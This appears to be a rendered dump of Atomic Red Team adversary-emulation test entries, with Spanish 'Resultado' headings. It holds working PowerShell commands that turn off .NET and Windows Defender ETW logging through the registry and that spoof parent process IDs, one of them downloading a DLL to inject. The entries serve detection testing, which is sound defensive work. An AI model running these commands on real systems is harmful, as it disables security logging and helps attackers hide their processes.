<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 19c07a45-452d-4620-90ed-4c34fffbe758</li>
<li><strong>name</strong>: Disable .NET Event Tracing for Windows Via Registry (powershell)</li>
<li><strong>description</strong>: Disables ETW for the .NET Framework using PowerShell to update the Windows registry</li>
<li><strong>platforms</strong>: ['windows']</li>
<li><strong>command</strong>: New-ItemProperty -Path HKLM:\Software\Microsoft.NETFramework -Name ETWEnabled -Value 0 -PropertyType "DWord" -Force</li>
<li><strong>prereq_command</strong>: </li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: REG DELETE HKLM\Software\Microsoft.NETFramework /v ETWEnabled /f &gt; $null 2&gt;&amp;1</li>
<li><strong>mitre_id</strong>: T1562.006</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 69fc085b-5444-4879-8002-b24c8e1a3e02</li>
<li><strong>name</strong>: LockBit Black - Disable the ETW Provider of Windows Defender -Powershell</li>
<li>
<p><strong>description</strong>: An adversary can disable the ETW Provider of Windows Defender,
so nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.
https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: New-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows Defender/Operational" -Name Enabled  -PropertyType DWord -Value 0 -Force</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Remove-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows Defender/Operational" -Name Enabled -Force -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1562.006</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: b42c1f8c-399b-47ae-8fd8-763181395fee</li>
<li><strong>name</strong>: Disable .NET Event Tracing for Windows Via Environment Variable HKCU Registry - PowerShell</li>
<li><strong>description</strong>: Disables ETW for the .NET Framework by setting the COMPlus_ETWEnabled environment variable to 0 in the HKCU registry using PowerShell. In order for changes to take effect a logout might be required.</li>
<li><strong>platforms</strong>: ['windows']</li>
<li><strong>command</strong>: New-ItemProperty -Path HKCU:\Environment -Name COMPlus_ETWEnabled -Value 0 -PropertyType "String" -Force</li>
<li><strong>prereq_command</strong>: </li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: Remove-ItemProperty -Path HKCU:\Environment -Name COMPlus_ETWEnabled</li>
<li><strong>mitre_id</strong>: T1562.006</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 4d61779d-be7f-425c-b560-0cafb2522911</li>
<li><strong>name</strong>: Disable .NET Event Tracing for Windows Via Environment Variable HKLM Registry - PowerShell</li>
<li><strong>description</strong>: Disables ETW for the .NET Framework by setting the COMPlus_ETWEnabled environment variable to 0 in the HKLM registry using PowerShell. In order for changes to take effect a reboot might be required.</li>
<li><strong>platforms</strong>: ['windows']</li>
<li><strong>command</strong>: New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" -Name COMPlus_ETWEnabled -Value 0 -PropertyType "String" -Force</li>
<li><strong>prereq_command</strong>: </li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" -Name COMPlus_ETWEnabled</li>
<li><strong>mitre_id</strong>: T1562.006</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 58bd8c8d-3a1a-4467-a69c-439c75469b07</li>
<li><strong>name</strong>: Detect a Debugger Presence in the Machine</li>
<li><strong>description</strong>: Detecting a running debugger process or if the debugger is attached to a process via PowerShell</li>
<li><strong>platforms</strong>: ['windows']</li>
<li><strong>command</strong>: # Check for common debugger processes
$debuggerProcesses = Get-Process | Where-Object { $<em>.ProcessName -match "dbg" -or $</em>.ProcessName -match "debug" }</li>
</ul>
<h1>Check for debugging flags</h1>
<p>$debuggingFlags = [System.Diagnostics.Debugger]::IsAttached 
- <strong>prereq_command</strong>: 
- <strong>get_prereq_command</strong>: 
- <strong>cleanup_command</strong>: 
- <strong>mitre_id</strong>: T1622
- <strong>input_arguments.output_file</strong>: None
- <strong>input_arguments.script_path</strong>: None
- <strong>input_arguments.python_script</strong>: None
- <strong>input_arguments.pid_term</strong>: None
- <strong>input_arguments.MimiPenguin_Location</strong>: None
- <strong>input_arguments.autoit_path</strong>: None
- <strong>input_arguments.server_ip</strong>: None
- <strong>input_arguments.client_path</strong>: None
- <strong>input_arguments.server_port</strong>: None
- <strong>input_arguments.file_to_pad</strong>: None
- <strong>input_arguments.executable_binary</strong>: None
- <strong>input_arguments.command_to_execute</strong>: None
- <strong>input_arguments.file_path</strong>: None
- <strong>input_arguments.uacme_exe</strong>: None
- <strong>input_arguments.commandpath</strong>: None
- <strong>input_arguments.commandtorun</strong>: None
- <strong>input_arguments.shortcut_file_path</strong>: None
- <strong>input_arguments.cloudtrail_name</strong>: None
- <strong>input_arguments.s3_bucket_name</strong>: None
- <strong>input_arguments.region</strong>: None
- <strong>input_arguments.username</strong>: None
- <strong>input_arguments.password</strong>: None
- <strong>input_arguments.event_hub_name</strong>: None
- <strong>input_arguments.resource_group</strong>: None
- <strong>input_arguments.name_space_name</strong>: None
- <strong>input_arguments.stratus_path</strong>: None
- <strong>input_arguments.aws_region</strong>: None
- <strong>input_arguments.cloudwatch_log_group_name</strong>: None
- <strong>input_arguments.cloudwatch_log_stream_name</strong>: None
- <strong>input_arguments.target_email</strong>: None
- <strong>input_arguments.project-id</strong>: None
- <strong>input_arguments.ms_product</strong>: None
- <strong>input_arguments.syslog_path</strong>: None
- <strong>input_arguments.macos_audit_path</strong>: None
- <strong>input_arguments.system_log_path</strong>: None
- <strong>input_arguments.system_log_name1</strong>: None
- <strong>input_arguments.system_log_name2</strong>: None
- <strong>input_arguments.system_log_name3</strong>: None
- <strong>input_arguments.system_log_folder</strong>: None
- <strong>input_arguments.journal_folder</strong>: None
- <strong>input_arguments.log_path</strong>: None
- <strong>input_arguments.1st_target_mailbox</strong>: None
- <strong>input_arguments.2nd_target_mailbox</strong>: None
- <strong>input_arguments.3rd_target_mailbox</strong>: None
- <strong>input_arguments.ticket</strong>: None
- <strong>input_arguments.mimikatz_exe</strong>: None
- <strong>input_arguments.target</strong>: None
- <strong>input_arguments.user_name</strong>: None
- <strong>input_arguments.domain</strong>: None
- <strong>input_arguments.rubeus_url</strong>: None
- <strong>input_arguments.history_path</strong>: None
- <strong>input_arguments.dest_path</strong>: None
- <strong>input_arguments.package_checker</strong>: None
- <strong>input_arguments.package_installer</strong>: None
- <strong>input_arguments.flavor_command</strong>: None
- <strong>input_arguments.cleanup_command</strong>: None
- <strong>input_arguments.falcond_plist</strong>: None
- <strong>input_arguments.userdaemon_plist</strong>: None</p>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 069258f4-2162-46e9-9a25-c9c6c56150d2</li>
<li><strong>name</strong>: Parent PID Spoofing using PowerShell</li>
<li><strong>description</strong>: This test uses PowerShell to replicates how Cobalt Strike does ppid spoofing and masquerade a spawned process.
Upon execution, "Process C:\Program Files\Internet Explorer\iexplore.exe is spawned with pid ####" will be displayed and
calc.exe will be launched.</li>
</ul>
<p>Credit to In Ming Loh (https://github.com/countercept/ppid-spoofing/blob/master/PPID-Spoof.ps1)</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: . "$PathToAtomicsFolder\T1134.004\src\PPID-Spoof.ps1"
$ppid=Get-Process #{parent_process_name} | select -expand id
PPID-Spoof -ppid $ppid -spawnto "#{spawnto_process_path}" -dllpath "#{dll_path}"</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (Test-Path "#{dll_path}") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Type Directory (split-path "#{dll_path}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1134.004/bin/calc.dll" -OutFile "#{dll_path}"</p>
</li>
<li>
<p><strong>cleanup_command</strong>: Stop-Process -Name "#{dll_process_name}" -ErrorAction Ignore
Stop-Process -Name "#{spawnto_process_name}" -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1134.004</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 14920ebd-1d61-491a-85e0-fe98efe37f25</li>
<li><strong>name</strong>: Parent PID Spoofing - Spawn from Current Process</li>
<li><strong>description</strong>: Spawns a powershell.exe process as a child of the current process.</li>
<li><strong>platforms</strong>: ['windows']</li>
<li><strong>command</strong>: Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine '#{command_line}' -ParentId #{parent_pid}</li>
<li><strong>prereq_command</strong>: $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}</li>
<li>
<p><strong>get_prereq_command</strong>: Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force</p>
</li>
<li>
<p><strong>cleanup_command</strong>: </p>
</li>
<li><strong>mitre_id</strong>: T1134.004</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: {'description': 'File path or name of process to spawn', 'type': 'path', 'default': '$Env:windir\System32\WindowsPowerShell\v1.0\powershell.exe'}</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: e9f2b777-3123-430b-805d-5cedc66ab591</li>
<li><strong>name</strong>: Parent PID Spoofing - Spawn from svchost.exe</li>
<li><strong>description</strong>: Spawnd a process as a child of the first accessible svchost.exe process.</li>
<li><strong>platforms</strong>: ['windows']</li>
<li><strong>command</strong>: Get-CimInstance -ClassName Win32_Process -Property Name, CommandLine, ProcessId -Filter "Name = 'svchost.exe' AND CommandLine LIKE '%'" | Select-Object -First 1 | Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine '#{command_line}'</li>
